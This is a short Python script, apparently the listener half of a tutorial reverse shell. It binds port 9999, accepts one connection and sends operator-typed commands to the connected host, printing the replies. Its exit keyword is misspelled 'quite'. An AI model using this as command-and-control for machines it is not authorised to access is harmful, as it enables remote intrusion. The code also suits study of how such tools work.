import socket
import sys


# create socket

def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999

        s = socket.socket()

    except socket.error as msg:
        print("create socket error" + str(msg))

# binding the connection and listening
def bind_socket():
    try:
        global host
        global port
        global s

        print("your port to bind is " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("socket.bind error" + str(msg) +"keep trying ...")
        bind_socket()

# accepting the connection after listening to the port

def accept_connection():
    try:
       conn, address = s.accept()
       print("your connection is established " + " | IP " +address[0]+" Port | "+str(address[1]))
       send_command(conn)
       conn.close()

    except socket.error as msg:
        print("socket accepting error " +str(msg))

def send_command(conn):

    while True:
        cmd = input("enter command ")
        if cmd == "quite":
            conn.close()
            s.close()
            sys.exit()

        if len(cmd) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="  ")


create_socket()
bind_socket()
accept_connection()


